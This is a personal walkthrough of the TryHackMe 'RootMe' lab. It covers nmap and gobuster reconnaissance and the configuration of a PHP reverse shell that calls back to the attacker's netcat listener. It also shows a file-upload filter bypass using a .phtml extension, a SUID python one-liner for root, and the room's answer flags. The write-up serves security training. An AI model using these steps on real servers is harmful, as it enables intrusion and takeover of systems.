@@ -1,0 +1,146 @@
+This room can be found at https://tryhackme.com/room/rrootme
+
+Walkthrough
+This room contains 4 tasks, with the exception of task 1, each task has 1 more questions to answer.
+Task 1: Deplpoy the machine
+Task 2: Reconnaissance
+	-Scan the machine, how many ports are open?
+	-What version of Apache is running?
+	-What service is running on port 22?
+	-Find directories on the web server using the gobuster tool. What is the hidden directory?
+Task 3: Getting a shell
+	-user.txt (what is the flag?)
+Task 4: Priviledge escalation
+	-Search for files with SUID permission, which file is weird?
+	-Find a form to escalate  your privileges
+	-root.txt (what is the flag?)
+
+
+To start this ctf I will open up my terminal and perform an nmap scan on the target.
+	nmap 10.10.98.115 -A -T4
+
+This gave me the following relevent results.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HackIT - Home
+
+Using this information I am able to to answer the first 3 questions of Task 2.
+	-How many ports are open? 2
+	-What version of Apache is running? 2.4.29
+	-What service is running on port 22? ssh
+
+
+I opened the page in my browser.  There is a black screen with large white letters saying "root@rootme:~#|" with smaller letters
+below saying 'Can you root me?"  I viewed the page source but nothing stood out to me.
+
+Next I went back to my terminal to use gobuster. 
+root@ip-10-10-235-140:~# gobuster dir -u 10.10.98.115 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.98.115
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/uploads              (Status: 301) [Size: 314] [--> http://10.10.98.115/uploads/]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.98.115/css/]
+/js                   (Status: 301) [Size: 309] [--> http://10.10.98.115/js/]
+/panel                (Status: 301) [Size: 312] [--> http://10.10.98.115/panel/]
+/server-status        (Status: 403) [Size: 277]
+Progress: 218275 / 218276 (100.00%)
+
+Using these results I was able to answer the final question of task 2.
+	-What is the hidden directory? /panel/
+
+Next I went back to my browser and visited the /panel/ drectory.  It brought me to a file upload form.
+Knowing the next task required me to get a shell uploaded onto the server I went to github and downloaded the
+pentester monkey reverse shell script.  Its a commonly used reverse shell.
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+The only modification I made to the script was to change the ip address of the listening machine
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.235.140';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+Next I used netcat to create a port listener.
+
+root@ip-10-10-235-140:~/Desktop# nc -lvnp 1234
+Listening on 0.0.0.0 1234
+
+I attempt to upload the shell but the .php file extension is not permitted.
+So not really expecting it to work I changed the filename from
+shell.php to shell.php.jpg and was able to upload the file. 
+Had that failed, I was going to use burp suite to test file exensions.
+
+I go to /uploads/ directory to confirm that the shell was uploaded and it had been.
+I click on the shell.php.jpg file in the directory and the following text appears on screen.
+The image "http://10.10.98.115/uploads/shell.php.jpg" cannot be displayed because it contains errors.
+
+Despite my previus claim that I would use burp suite next, I decided to try a few more .php file extension alternatives first.
+So I changed the filename to shell.phtml and reuploaded it.  It was successful.  I went to the uploads directory and found the
+upload. I clicked on it and -insert Mr Robot voice- I'm in.
+
+root@ip-10-10-235-140:~/Desktop# nc -lvnp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.98.115 48344
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 05:15:28 up 59 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+
+And then my attackbox crashed.
+
+After restarting my atatckbox I got a new shell on the system.  I looked around the file system for a few minutes before using the find command
+to locate the user.txt file and then open it to find the fiag.
+$ cat /var/www/user.txt
+	-user.txt(what is the flag?) THM{y0u_g0t_a_sh3ll}
+
+The final task is to escelate my privileges on the machine.
+First, I run the command find /-user root -perm /4000 and check the files to see which one stands out.
+Unfortunately none of the files I could see in my terminal were correct and for whatever reason the terminal in the attackbox would not allow
+me to scroll up enough to view all of the results from the command.  I was forced to google the answer.
+
+	-Search for files with the SUID permission, which file feels weird? /usr/bin/pythom
+
+Next I went to the gtf website and went to the suid section under python
+https://gtfobins.github.io/gtfobins/python/#suid
+
+I found the following command 
+
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+Once I ran that command, I was elevated to root.  I used
+find -name root.txt to find the answer to the final question.
+
+	-root.txt (what is the flag?) THM{pr1v1l3g3_3sc4l4t10n}
+
+This was a faily straight forward and simple ctf.  It was unfornate that I had to use outside help to find one of the answers, but thats just how these things
+go sometimes.  
